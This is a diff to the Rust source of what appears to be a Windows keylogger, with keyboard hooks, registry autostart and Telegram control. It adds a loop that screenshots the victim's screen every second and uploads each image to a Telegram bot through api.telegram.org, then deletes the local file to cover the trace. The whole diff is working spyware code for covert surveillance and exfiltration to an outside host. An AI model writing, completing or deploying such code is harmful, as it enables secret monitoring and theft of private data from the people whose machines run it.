@@ -12,9 +12,14 @@ use winapi::um::winuser::{GetKeyboardLayout, GetWindowThreadProcessId, GetForegr
 
 // для telegram
 use tokio;
+use std::fs::File;
+use screenshots::Screen;
+use reqwest::blocking::multipart;
+use std::thread;
 
 // определение url
 use std::ptr::null_mut;
+use std::time::Duration;
 
 // для автозапуска
 use winreg::enums::*;
@@ -158,6 +163,53 @@ fn release_hook(hook: HHOOK) {
 }
 
 
+//
+fn make_screen() {
+    loop {
+        if let Err(e) = send_screen() {
+            eprintln!("Ошибка отправки скриншота: {}", e);
+        }
+        thread::sleep(Duration::from_secs(1));
+    }
+}
+
+
+fn send_screen() -> Result<(), Box<dyn std::error::Error>> {
+    let bot_token = config::BOT_TOKEN;
+    let chat_id = config::CHAT_ID;
+    let temp_file = "screenshot.jpg";
+
+    let screens = Screen::all()?;
+    let screen = screens.first().ok_or("Нет доступных экранов")?;
+    let image = screen.capture()?;
+    image.save(temp_file)?;
+
+    let url = format!(
+        "https://api.telegram.org/bot{}/sendPhoto?chat_id={}",
+        bot_token, chat_id
+    );
+
+    let file = File::open(temp_file)?;
+    let part = multipart::Part::reader(file)
+        .file_name("screenshot.png")
+        .mime_str("image/png")?;
+
+    let form = multipart::Form::new().part("photo", part);
+
+    let client = reqwest::blocking::Client::new();
+    let response = client.post(url)
+        .multipart(form)
+        .send()?;
+
+    if !response.status().is_success() {
+        return Err(format!("Ошибка Telegram API: {}", response.text()?).into());
+    }
+
+    std::fs::remove_file(temp_file)?;
+    Ok(())
+}
+
+
 // функция добавления в автозапуск
 fn add_to_startup() -> Result<(), Box<dyn std::error::Error>> {
     let exe_path = std::env::current_exe()?;
@@ -204,6 +256,12 @@ async fn main() {
         loop {
             tg::check(len).await;
         }
+    });
+
+
+    // Запускаем скрины на фоне
+    thread::spawn(move || {
+        make_screen();
     });
 
     // закидываем удочку
